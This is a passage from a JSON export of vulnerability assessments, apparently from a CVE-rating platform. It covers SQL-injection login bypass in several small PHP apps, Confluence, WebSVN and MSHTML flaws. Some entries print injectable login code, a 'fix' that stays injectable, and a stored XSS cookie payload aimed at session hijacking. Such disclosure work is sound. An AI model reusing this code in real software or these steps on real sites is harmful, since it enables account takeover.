            "source": "system"
          },
          "code": "high_privilege_access"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        }
      ]
    },
    {
      "id": "0a9c6ea7-9cb1-4ae5-9717-5ed2ffdf51d5",
      "editorId": "198da8db-21b5-4678-a70d-51ae5c950847",
      "topicId": "529ab97b-7794-4dff-9a4d-491168bdc2f6",
      "created": "2021-08-31T14:25:00.9645Z",
      "revisionDate": "2021-08-31T16:35:24.089985Z",
      "document": "# CVE-nu11-03\r\n## Online Leave Management System SQL-Injection-Bypass-Authentication:\r\n![](https://github.com/nu11secur1ty/CVE-nu11secur1ty/blob/main/vendors/oretnom23/CVE-nu11-03/Capture.PNG)\r\n\r\n## Vendor:\r\n- [+] [href](https://www.youtube.com/channel/UCEHRo563wbV8JrRSdNajTvQ)\r\n\r\n## Description:\r\nThe OLMS - PHP (by: oretnom23 ) v1.0 is vulnerable in the application /leave_system/classes/Login.php from SQL-Injection-Bypass-Authentication\r\nm0re info: https://portswigger.net/support/using-sql-injection-to-bypass-authentication. \r\nThe parameter (username) from the login form is not protected correctly and there is no security and escaping from malicious payloads. \r\nWhen the user will sending a malicious query or malicious payload to the MySQL server he can bypass the login credentials and take control of the administer account.\r\n\r\n## Broken query:\r\n```php\r\n\tpublic function login(){\r\n\t\textract($_POST);\r\n\r\n\t\t$qry = $this->conn->query(\"SELECT * from users where username = '$username' and password = md5('$password') \");\r\n\t\tif($qry->num_rows > 0){\r\n\t\t\tforeach($qry->fetch_array() as $k => $v){\r\n\t\t\t\tif(!is_numeric($k) && $k != 'password'){\r\n\t\t\t\t\t$this->settings->set_userdata($k,$v);\r\n\t\t\t\t}\r\n\r\n\t\t\t}\r\n```\r\n## The fix, but not strong enough!\r\n```php\r\npublic function login(){\r\n\t\textract($_POST);\r\n\r\n\t\t$qry = $this->conn->query(\"SELECT * from users where username = ('$username') and password = md5('$password') \");\r\n\t\tif($qry->num_rows > 0){\r\n\t\t\tforeach($qry->fetch_array() as $k => $v){\r\n\t\t\t\tif(!is_numeric($k) && $k != 'password'){\r\n\t\t\t\t\t$this->settings->set_userdata($k,$v);\r\n\t\t\t\t}\r\n\r\n\t\t\t}\r\n```\r\n\r\n## Proof: \r\n- [+][href](https://streamable.com/0i84gn)\r\n\r\n## Conclusion and solution of the problem:\r\n- [+][href](https://www.nu11secur1ty.com/2021/08/php-sec-login.html)\r\n\r\n## BR \r\n- [+] @nu11secur1ty",
      "score": 2,
      "metadata": {
        "mitre-tactics": "Execution",
        "attacker-value": 5,
        "exploitability": 5
      },
      "tags": [
        {
          "id": "067ecf0c-8227-4437-bc04-a92d84b545bb",
          "name": "Easy to weaponize",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "easy_to_develop"
        },
        {
          "id": "8f7ef49d-26f4-46b1-9676-599f6669f4d3",
          "name": "Gives privileged access",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "high_privilege_access"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        }
      ]
    },
    {
      "id": "1c0d8076-a017-4ec4-8c9f-61cae15fe6d5",
      "editorId": "198da8db-21b5-4678-a70d-51ae5c950847",
      "topicId": "557daa1a-1559-4d19-b391-34833593bb7c",
      "created": "2021-08-31T14:31:36.998405Z",
      "revisionDate": "2021-08-31T16:35:07.980424Z",
      "document": "## Ship Ferry Ticket Reservation System `v1.0` \r\n\r\n![](https://github.com/nu11secur1ty/CVE-nu11secur1ty/blob/main/vendors/CVE-nu11-02/docs/Capture.PNG)\r\n\r\n### [Vendor](https://www.sourcecodester.com/php/14923/shipferry-ticket-reservation-system-using-php-free-source-code.html)\r\n\r\n### Description:\r\nThe Ship/Ferry Ticket Reservation System `v1.0` is vulnerable in the application /ship_ticketing/classes/Login.php from [SQL-Injection-Bypass-Authentication](https://portswigger.net/support/using-sql-injection-to-bypass-authentication). \r\nThe parameter (username) from the login form is not protected correctly and there is no security and escaping from malicious payloads. \r\nWhen the user will sending a malicious query or malicious payload to the MySQL server he can bypass the login credentials and take control of the administer account.\r\n\r\n\r\n## Broken structure:\r\n```php\r\n\tpublic function login(){\r\n\t\textract($_POST);\r\n\r\n\t\t$qry = $this->conn->query(\"SELECT * from users where username = '$username' and password = md5('$password') \");\r\n\t\tif($qry->num_rows > 0){\r\n\t\t\tforeach($qry->fetch_array() as $k => $v){\r\n\t\t\t\tif(!is_numeric($k) && $k != 'password'){\r\n\t\t\t\t\t$this->settings->set_userdata($k,$v);\r\n\t\t\t\t}\r\n\r\n\t\t\t}\r\n ```\r\n---------------------------------------------------------------------------------------------------------------------\r\n\r\n## Simple fix, but not enough `strong`!!!:\r\n```php\r\n\tpublic function login(){\r\n\t\textract($_POST);\r\n\r\n\t\t$qry = $this->conn->query(\"SELECT * from users where username = ('$username') and password = md5('$password') \");\r\n\t\tif($qry->num_rows > 0){\r\n\t\t\tforeach($qry->fetch_array() as $k => $v){\r\n\t\t\t\tif(!is_numeric($k) && $k != 'password'){\r\n\t\t\t\t\t$this->settings->set_userdata($k,$v);\r\n\t\t\t\t}\r\n\r\n\t\t\t}\r\n ```\r\n## Proof:\r\n[href](https://streamable.com/h65olk)\r\n\r\n\r\n### BR\r\n[+] @nu11secur1ty",
      "score": 2,
      "metadata": {
        "mitre-tactics": "Execution",
        "attacker-value": 5,
        "exploitability": 5
      },
      "tags": [
        {
          "id": "067ecf0c-8227-4437-bc04-a92d84b545bb",
          "name": "Easy to weaponize",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "easy_to_develop"
        },
        {
          "id": "8f7ef49d-26f4-46b1-9676-599f6669f4d3",
          "name": "Gives privileged access",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "high_privilege_access"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        }
      ]
    },
    {
      "id": "ace19328-d19f-4609-ad89-c65e4aca4a70",
      "editorId": "def09af1-8f99-4d16-aaa9-1db131246a3a",
      "topicId": "d0a75abf-92a4-40b6-ac30-229605e2a65c",
      "created": "2021-09-01T16:26:04.36979Z",
      "revisionDate": "2021-09-01T16:26:04.360046Z",
      "document": " Unknown actors are actively exploiting a disclosed command injection vulnerability affecting WebSVN, an open-source web application for browsing source.\r\nThe actors used a command injection to download a shell script that will infect the system with malware.\r\nhttps://unit42.paloaltonetworks.com/cve-2021-32305-websvn/",
      "score": 1,
      "metadata": {},
      "tags": [
        {
          "id": "791283de-d643-4ede-850e-91a6edb897db",
          "name": "Exploited in the wild",
          "type": "exploited_in_the_wild",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "exploited_in_the_wild"
        }
      ]
    },
    {
      "id": "efe7d9cf-43a0-43e7-a927-e8ae9f0c1007",
      "editorId": "def09af1-8f99-4d16-aaa9-1db131246a3a",
      "topicId": "83332f26-a0ee-40ba-b796-8ee84ed704bc",
      "created": "2021-09-01T17:38:13.534999Z",
      "revisionDate": "2021-09-01T23:26:32.139805Z",
      "document": "PoC exploit is publicly available https://github.com/httpvoid/writeups/blob/main/Confluence-RCE.md",
      "score": 2,
      "metadata": {},
      "tags": []
    },
    {
      "id": "c820b4fb-773e-4ac2-bb58-f447bd757e71",
      "editorId": "110c4bc0-d96d-4bdc-a633-e66ae23e7b9b",
      "topicId": "83332f26-a0ee-40ba-b796-8ee84ed704bc",
      "created": "2021-09-02T01:27:50.114064Z",
      "revisionDate": "2021-09-04T02:24:43.072482Z",
      "document": "Please see the [Rapid7 analysis](https://attackerkb.com/topics/Eu74wdMbEL/cve-2021-26084-confluence-server-ognl-injection/rapid7-analysis). Thank you to [Jang (@testanull)](https://twitter.com/testanull) for being a great collaborator. :)",
      "score": 3,
      "metadata": {
        "attacker-value": 5,
        "exploitability": 5
      },
      "tags": [
        {
          "id": "392ac474-91f1-4944-ad4f-78ce648b2df7",
          "name": "Common in enterprise",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "common_enterprise"
        },
        {
          "id": "067ecf0c-8227-4437-bc04-a92d84b545bb",
          "name": "Easy to weaponize",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "easy_to_develop"
        },
        {
          "id": "240789d2-3e0b-4967-a6a4-8f09029f642d",
          "name": "Unauthenticated",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "pre_auth"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        }
      ]
    },
    {
      "id": "f6d09cc7-459e-442b-be8e-56f16a1598e3",
      "editorId": "198da8db-21b5-4678-a70d-51ae5c950847",
      "topicId": "255ad8e4-cffd-4e96-8517-115953336f9e",
      "created": "2021-09-02T10:38:09.459136Z",
      "revisionDate": "2021-09-02T16:10:11.130665Z",
      "document": "## CVE-nu11-05 MSMS-PHP (by: oretnom23 ) v1.0 HIT STRIKE\r\n![](https://github.com/nu11secur1ty/CVE-nu11secur1ty/blob/main/vendors/oretnom23/CVE-nu11-05/docs/Capture.PNG)\r\n\r\n### Description:\r\nThe MSMS-PHP (by: oretnom23 ) v1.0 is vulnerable in three sections!\r\n- - - remote SQL-Injection-Bypass-Authentication\r\n- m0re info: https://portswigger.net/support/using-sql-injection-to-bypass-authentication. \r\nThe parameter (username) from the login form is not protected correctly and there is no security and escaping from malicious payloads. \r\nWhen the user will sending a malicious query or malicious payload to the MySQL server he can bypass the login credentials and take control of the administer account.\r\n- - - XSS - Stored PHPSESSID Vulnerable\r\n- - The vulnerable XSS app: is \"brand\", parameters: \"name\" and \"description\"\r\nAfter the successful SQL injection, the malicious user can be storing an XSS payload whit who can take the \r\nactive PHPSESSID session.\r\n- - - remote PHPSESSID - Hijacking\r\n- After the successful XSS attack the malicious user can take control of the administrative account of the system from everywhere \r\nby using the PHPSESSID, and then he can make a lot of bad things!\r\n\r\n----------------------------------------------------------------------------------\r\n### Remote vulnerable links execution:\r\n- - - [+] . http://localhost/mobile_store/admin/login.php\r\n- - - [+] . http://localhost/mobile_store/admin/?page=maintenance/brand\r\n\r\n----------------------------------------------------------------------------------\r\n## Broken query:\r\n```php\r\n\tpublic function login(){\r\n\t\textract($_POST);\r\n\r\n\t\t$qry = $this->conn->query(\"SELECT * from users where username = '$username' and password = md5('$password') \");\r\n\t\tif($qry->num_rows > 0){\r\n\t\t\tforeach($qry->fetch_array() as $k => $v){\r\n\t\t\t\tif(!is_numeric($k) && $k != 'password'){\r\n\t\t\t\t\t$this->settings->set_userdata($k,$v);\r\n\t\t\t\t}\r\n\r\n\t\t\t}\r\n```\r\n## The fix, but not strong enough!\r\n \r\n```php\r\n\tpublic function login(){\r\n\t\textract($_POST);\r\n\r\n\t\t$qry = $this->conn->query(\"SELECT * from users where username = ('$username') and password = md5('$password') \");\r\n\t\tif($qry->num_rows > 0){\r\n\t\t\tforeach($qry->fetch_array() as $k => $v){\r\n\t\t\t\tif(!is_numeric($k) && $k != 'password'){\r\n\t\t\t\t\t$this->settings->set_userdata($k,$v);\r\n\t\t\t\t}\r\n\r\n\t\t\t}\r\n```\r\n## Stored XSS payload:\r\n```html\r\n<p class=\"truncate-1 m-0\">alert(document.cookie)</p>\r\n```\r\n\r\n## Proof:\r\n- [+] [href](https://streamable.com/c9dyxb)\r\n\r\n\r\n### CONCLUSION: \r\n- - - [+] `This vendor must STOP creating all these broken projects and vulnerable software programs, probably he is not a developer!`\r\n\r\n### BR \r\n- [+] @nu11secur1ty System Administrator - Infrastructure and Penetration Testing Engineer\r\n",
      "score": 1,
      "metadata": {
        "mitre-tactics": "Execution",
        "attacker-value": 5,
        "exploitability": 5
      },
      "tags": [
        {
          "id": "067ecf0c-8227-4437-bc04-a92d84b545bb",
          "name": "Easy to weaponize",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "easy_to_develop"
        },
        {
          "id": "8f7ef49d-26f4-46b1-9676-599f6669f4d3",
          "name": "Gives privileged access",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "high_privilege_access"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        }
      ]
    },
    {
      "id": "90907f00-a8e6-4fc3-aedc-24de7648ca6e",
      "editorId": "65729f1a-edfe-469e-94ed-f675454a0cd8",
      "topicId": "83332f26-a0ee-40ba-b796-8ee84ed704bc",
      "created": "2021-09-03T02:03:29.380762Z",
      "revisionDate": "2021-09-07T10:25:31.154836Z",
      "document": "very high",
      "score": -1,
      "metadata": {
        "mitre-tactics": "Persistence",
        "attacker-value": 5,
        "exploitability": 4
      },
      "tags": []
    },
    {
      "id": "447466d0-df9a-4a2f-8f54-37f7df43fc27",
      "editorId": "639bf117-ba70-4461-8a17-65ad4a023194",
      "topicId": "83332f26-a0ee-40ba-b796-8ee84ed704bc",
      "created": "2021-09-04T01:44:39.226954Z",
      "revisionDate": "2021-09-04T01:44:39.219944Z",
      "document": "",
      "score": 1,
      "metadata": {
        "mitre-tactics": "Privilege Escalation",
        "attacker-value": 3
      },
      "tags": [
        {
          "id": "067ecf0c-8227-4437-bc04-a92d84b545bb",
          "name": "Easy to weaponize",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "easy_to_develop"
        },
        {
          "id": "791283de-d643-4ede-850e-91a6edb897db",
          "name": "Exploited in the wild",
          "type": "exploited_in_the_wild",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "exploited_in_the_wild"
        },
        {
          "id": "8f7ef49d-26f4-46b1-9676-599f6669f4d3",
          "name": "Gives privileged access",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "high_privilege_access"
        }
      ]
    },
    {
      "id": "6aecfcf4-310f-4f44-a38b-b1634afb6bf1",
      "editorId": "639bf117-ba70-4461-8a17-65ad4a023194",
      "topicId": "16678767-3de3-4ba4-8797-50d3f72b2b5c",
      "created": "2021-09-04T02:28:34.389381Z",
      "revisionDate": "2021-09-04T02:35:06.932623Z",
      "document": "MISC:https://chromereleases.googleblog.com/2021/08/stable-channel-update-for-desktop_31.html\r\nURL:https://chromereleases.googleblog.com/2021/08/stable-channel-update-for-desktop_31.html\r\nMISC:https://crbug.com/1232279\r\nURL:https://crbug.com/1232279",
      "score": 1,
      "metadata": {
        "mitre-tactics": "Initial Access"
      },
      "tags": [
        {
          "id": "392ac474-91f1-4944-ad4f-78ce648b2df7",
          "name": "Common in enterprise",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "common_enterprise"
        },
        {
          "id": "067ecf0c-8227-4437-bc04-a92d84b545bb",
          "name": "Easy to weaponize",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "easy_to_develop"
        },
        {
          "id": "791283de-d643-4ede-850e-91a6edb897db",
          "name": "Exploited in the wild",
          "type": "exploited_in_the_wild",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "exploited_in_the_wild"
        },
        {
          "id": "8f7ef49d-26f4-46b1-9676-599f6669f4d3",
          "name": "Gives privileged access",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "high_privilege_access"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        },
        {
          "id": "b65c2492-bb05-477a-86bb-0c9569f80141",
          "name": "Authenticated",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "post_auth"
        },
        {
          "id": "795f5056-8a39-4610-912c-c033bd6fd4cb",
          "name": "Vulnerable in uncommon configuration",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "obscure_configuration"
        }
      ]
    },
    {
      "id": "3a825cee-23b3-451c-a3c3-e3738e082ba4",
      "editorId": "198da8db-21b5-4678-a70d-51ae5c950847",
      "topicId": "17195884-3f5f-4379-953d-48b53037deef",
      "created": "2021-09-06T10:08:01.352975Z",
      "revisionDate": "2021-09-07T08:39:57.492237Z",
      "document": "## [CVE-nu11-07](https://www.sourcecodester.com/php/14929/online-learning-system-v2-using-php-free-source-code.html)\r\n## [VENDOR](https://www.sourcecodester.com/user/257130/activity)\r\n\r\n- - - ## eLearning V2(by: oretnom23) is vulnerable from remote SQL-Injection-Bypass-Authentication\r\n \r\n![](https://github.com/nu11secur1ty/CVE-nu11secur1ty/blob/main/vendors/oretnom23/CVE-nu11-07/docs/lesson.png)\r\n\r\n### Description:\r\nThe eLearning V2(by: oretnom23) is vulnerable from remote SQL-Injection-Bypass-Authentication in 3 accounts of the system (admin, Faculty & Student) in app /elearning/classes/Login.php.\r\nremote SQL-Injection-Bypass-Authentication: https://portswigger.net/support/using-sql-injection-to-bypass-authentication. \r\nThe parameter (username, faculty_id, and student_id) from the login form is not protected correctly and there is no security and escaping from malicious payloads. \r\nWhen the user will sending a malicious query or malicious payload to the MySQL server for those three accounts, he can bypass the login credentials and take control of these accounts.\r\n\r\n\r\n- - - Vulnerable `PHP` app code in `/elearning/classes/Login.php`\r\n\r\n```php\r\n\tpublic function login(){\r\n\t\textract($_POST);\r\n\r\n\t\t$qry = $this->conn->query(\"SELECT * from users where username = '$username' and password = md5('$password') \");\r\n\t\tif($qry->num_rows > 0){\r\n\t\t\tforeach($qry->fetch_array() as $k => $v){\r\n\t\t\t\tif(!is_numeric($k) && $k != 'password'){\r\n\t\t\t\t\t$this->settings->set_userdata($k,$v);\r\n\t\t\t\t}\r\n\r\n\t\t\t}\r\n\t\t\t$this->settings->set_userdata('login_type',1);\r\n\t\t$sy = $this->conn->query(\"SELECT * FROM academic_year where status = 1\");\r\n\t\tforeach($sy->fetch_array() as $k =>$v){\r\n\t\t\tif(!is_numeric($k)){\r\n\t\t\t$this->settings->set_userdata('academic_'.$k,$v);\r\n\t\t\t}\r\n\t\t}\r\n\t\treturn json_encode(array('status'=>'success'));\r\n\t\t}else{\r\n\t\treturn json_encode(array('status'=>'incorrect','last_qry'=>\"SELECT * from users where username = '$username' and password = md5('$password') \"));\r\n\t\t}\r\n\t}\r\n\tpublic function flogin(){\r\n\t\textract($_POST);\r\n\r\n\t\t$qry = $this->conn->query(\"SELECT * from faculty where  faculty_id = '$faculty_id' and `password` = '\".md5($password).\"' \");\r\n\t\tif($qry->num_rows > 0){\r\n\t\t\tforeach($qry->fetch_array() as $k => $v){\r\n\t\t\t\tif(!is_numeric($k)){\r\n\t\t\t\t\t$this->settings->set_userdata($k,$v);\r\n\t\t\t\t}\r\n\r\n\t\t\t}\r\n\t\t\t$this->settings->set_userdata('login_type',2);\r\n\t\t\t$sy = $this->conn->query(\"SELECT * FROM academic_year where status = 1\");\r\n\t\tforeach($sy->fetch_array() as $k =>$v){\r\n\t\t\tif(!is_numeric($k)){\r\n\t\t\t$this->settings->set_userdata('academic_'.$k,$v);\r\n\t\t\t}\r\n\t\t}\r\n\t\t\treturn json_encode(array('status'=>'success'));\r\n\t\t}else{\r\n\t\treturn json_encode(array('status'=>'incorrect'));\r\n\t\t}\r\n\t}\r\n\tpublic function slogin(){\r\n\t\textract($_POST);\r\n\r\n\t\t$qry = $this->conn->query(\"SELECT * from students where  student_id = '$student_id' and `password` = '\".md5($password).\"' \");\r\n\t\tif($qry->num_rows > 0){\r\n\t\t\tforeach($qry->fetch_array() as $k => $v){\r\n\t\t\t\tif(!is_numeric($k)){\r\n\t\t\t\t\t$this->settings->set_userdata($k,$v);\r\n\t\t\t\t}\r\n\r\n\t\t\t}\r\n```\r\n\r\n-------------------------------------------------------------------\r\n### CONCLUSION: \r\n\r\n- This vendor must STOP creating all these broken projects and vulnerable software programs, probably he is not a developer!\r\n\r\n- [+] by @nu11secur1ty System Administrator - Infrastructure and Penetration Testing Engineer\r\n\r\n-------------------------------------------------------------------\r\n\r\n## Reproduce:\r\n```url\r\nhttps://github.com/nu11secur1ty/CVE-nu11secur1ty/tree/main/vendors/oretnom23/CVE-nu11-07\r\n```\r\n\r\n## Proof: \r\n[href](https://streamable.com/j44hz0)\r\n\r\n## BR\r\n@nu11secur1ty",
      "score": 1,
      "metadata": {
        "mitre-tactics": "Execution",
        "attacker-value": 5,
        "exploitability": 5
      },
      "tags": [
        {
          "id": "067ecf0c-8227-4437-bc04-a92d84b545bb",
          "name": "Easy to weaponize",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "easy_to_develop"
        },
        {
          "id": "8f7ef49d-26f4-46b1-9676-599f6669f4d3",
          "name": "Gives privileged access",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "high_privilege_access"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        },
        {
          "id": "b65c2492-bb05-477a-86bb-0c9569f80141",
          "name": "Authenticated",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "post_auth"
        }
      ]
    },
    {
      "id": "2e3614c2-f82d-4ade-ac55-6d47b6c0c241",
      "editorId": "110c4bc0-d96d-4bdc-a633-e66ae23e7b9b",
      "topicId": "bc685da4-0047-4567-9ad5-9746b6ac8e5f",
      "created": "2021-09-07T04:22:37.326041Z",
      "revisionDate": "2021-09-07T04:43:07.195167Z",
      "document": "Super easy to exploit. See [CVE-2021-20021](https://attackerkb.com/assessments/43dd6dbb-2aee-41c0-871a-fa325358081c) for the first part of the chain.",
      "score": 1,
      "metadata": {
        "attacker-value": 5,
        "exploitability": 5
      },
      "tags": [
        {
          "id": "392ac474-91f1-4944-ad4f-78ce648b2df7",
          "name": "Common in enterprise",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "common_enterprise"
        },
        {
          "id": "067ecf0c-8227-4437-bc04-a92d84b545bb",
          "name": "Easy to weaponize",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "easy_to_develop"
        },
        {
          "id": "8f7ef49d-26f4-46b1-9676-599f6669f4d3",
          "name": "Gives privileged access",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "high_privilege_access"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        },
        {
          "id": "b65c2492-bb05-477a-86bb-0c9569f80141",
          "name": "Authenticated",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "post_auth"
        }
      ]
    },
    {
      "id": "c2009202-e813-4500-8d6f-8e9c364db159",
      "editorId": "198da8db-21b5-4678-a70d-51ae5c950847",
      "topicId": "d3bccee1-ae82-4a8f-b215-08715b42a3ac",
      "created": "2021-09-07T10:58:18.827979Z",
      "revisionDate": "2021-09-07T11:12:53.911747Z",
      "document": "## [CVE-nu11-08-09072021](https://www.sourcecodester.com/php/14932/storage-unit-rental-management-system-using-php-free-source-code.html)\r\n## [VENDOR](https://www.sourcecodester.com/user/257130/activity)\r\n![](https://github.com/nu11secur1ty/CVE-nu11secur1ty/blob/main/vendors/oretnom23/CVE-nu11-08-09072021/Capture.PNG)\r\n\r\n### Vulnerability Description:\r\nThe SURMS - PHP (by: oretnom23 ) v1.0 is vulnerable from remote SQL-Injection-Bypass-Authentication for the admin account in app: /storage/classes/Login.php and XSS PWNED PHPSESSID Hijacking in app \"tenants\". \r\nRemote SQL-Injection-Bypass-Authentication: https://portswigger.net/support/using-sql-injection-to-bypass-authentication. \r\nThe parameter (username) from the login form is not protected correctly and there is no security and escaping from malicious payloads. \r\nWhen the user will sending a malicious query or malicious payload to the MySQL server for those three accounts, he can bypass the login credentials and take control of these accounts.\r\nAnd the second time he can access the admin account by using the PHPSESSID Hijacking technique.\r\n\r\n## Vulnerable PHP code:\r\n```PHP\r\n\tpublic function login(){\r\n\t\textract($_POST);\r\n\r\n\t\t$qry = $this->conn->query(\"SELECT * from users where username = '$username' and password = md5('$password') \");\r\n\t\tif($qry->num_rows > 0){\r\n\t\t\tforeach($qry->fetch_array() as $k => $v){\r\n\t\t\t\tif(!is_numeric($k) && $k != 'password'){\r\n\t\t\t\t\t$this->settings->set_userdata($k,$v);\r\n\t\t\t\t}\r\n\r\n\t\t\t}\r\n\t\t\t$this->settings->set_userdata('login_type',1);\r\n\t\treturn json_encode(array('status'=>'success'));\r\n\t\t}else{\r\n\t\treturn json_encode(array('status'=>'incorrect','last_qry'=>\"SELECT * from users where username = '$username' and password = md5('$password') \"));\r\n\t\t}\r\n\t}\r\n```\r\n## Proof:\r\n[href](https://streamable.com/9efynl)",
      "score": 1,
      "metadata": {
        "mitre-tactics": "Execution",
        "attacker-value": 5,
        "exploitability": 5
      },
      "tags": [
        {
          "id": "067ecf0c-8227-4437-bc04-a92d84b545bb",
          "name": "Easy to weaponize",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "easy_to_develop"
        },
        {
          "id": "8f7ef49d-26f4-46b1-9676-599f6669f4d3",
          "name": "Gives privileged access",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "high_privilege_access"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        }
      ]
    },
    {
      "id": "734f786a-5343-456c-a2c0-f161608fe8b5",
      "editorId": "def09af1-8f99-4d16-aaa9-1db131246a3a",
      "topicId": "f7ccd0b7-220b-49e5-a4df-27e26b64a3f0",
      "created": "2021-09-07T18:45:44.574016Z",
      "revisionDate": "2021-09-07T18:47:51.980437Z",
      "document": "Microsoft MSHTML Remote Code Execution Vulnerability\r\nMicrosoft is investigating reports of a remote code execution vulnerability in MSHTML that affects Microsoft Windows. Microsoft is aware of targeted attacks that attempt to exploit this vulnerability by using specially-crafted Microsoft Office documents.\r\n\r\nA threat actor could craft a malicious ActiveX control to be used by a Microsoft Office document that hosts the browser rendering engine. The attacker would then have to convince the user to open the malicious document. Users whose accounts are configured to have fewer user rights on the system could be less impacted than users who operate with administrative user rights.\r\n\r\nhttps://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-40444\r\n\r\n\r\n",
      "score": 1,
      "metadata": {},
      "tags": [
        {
          "id": "791283de-d643-4ede-850e-91a6edb897db",
          "name": "Exploited in the wild",
          "type": "exploited_in_the_wild",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "exploited_in_the_wild"
        }
      ]
    },
    {
      "id": "e3bf82b4-f589-43e8-a160-fe41922c6187",
      "editorId": "9c3c0bdd-7a98-48de-a889-f351a2aec7cf",
      "topicId": "f7ccd0b7-220b-49e5-a4df-27e26b64a3f0",
      "created": "2021-09-07T19:12:09.646983Z",
      "revisionDate": "2021-09-07T22:47:03.004928Z",
      "document": "Sounds from Microsoft's [out-of-band advisory](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-40444) like this is seeing limited, targeted attacks and folks are only vulnerable in non-default configurations (i.e., \"by default, Microsoft Office opens documents from the internet in Protected View or Application Guard for Office both of which prevent the current attack\"). All this plus user interaction required = another social engineering opportunity for attackers with specific targets, but probably not a big concern as far as widespread, automated exploitation goes. No patch yet, but sounds like the most out-of-the-box mitigation is just to use the default option of opening docs in a protected manner.",
      "score": 3,
      "metadata": {
        "attacker-value": 3,
        "exploitability": 2
      },
      "tags": [
        {
          "id": "01c67142-c23f-4ee7-8803-49d10d588299",
          "name": "Requires user interaction",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "requires_interaction"
        },
        {
          "id": "795f5056-8a39-4610-912c-c033bd6fd4cb",
          "name": "Vulnerable in uncommon configuration",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "obscure_configuration"
        }
      ]
    },
    {
      "id": "2e03df1f-3287-4c3e-be7d-f382cbce2117",
      "editorId": "1e6e0edd-3e8b-4237-ac7d-7f15fd73585f",
      "topicId": "f7ccd0b7-220b-49e5-a4df-27e26b64a3f0",
      "created": "2021-09-07T22:50:22.225424Z",
      "revisionDate": "2021-09-08T14:58:35.643685Z",
      "document": "- Vulnerable if default behaviour has been changed ( By default, Microsoft Office opens documents from the internet in Protected View or Application Guard for Office both of which prevent the current attack )\r\n- Requires social engineering to be exploited\r\n- Workaround easy to deploy",
      "score": 3,
      "metadata": {
        "attacker-value": 2,
        "exploitability": 2
      },
      "tags": [
        {
          "id": "791283de-d643-4ede-850e-91a6edb897db",
          "name": "Exploited in the wild",
          "type": "exploited_in_the_wild",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "exploited_in_the_wild"
        },
        {
          "id": "01c67142-c23f-4ee7-8803-49d10d588299",
          "name": "Requires user interaction",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "requires_interaction"
        },
        {
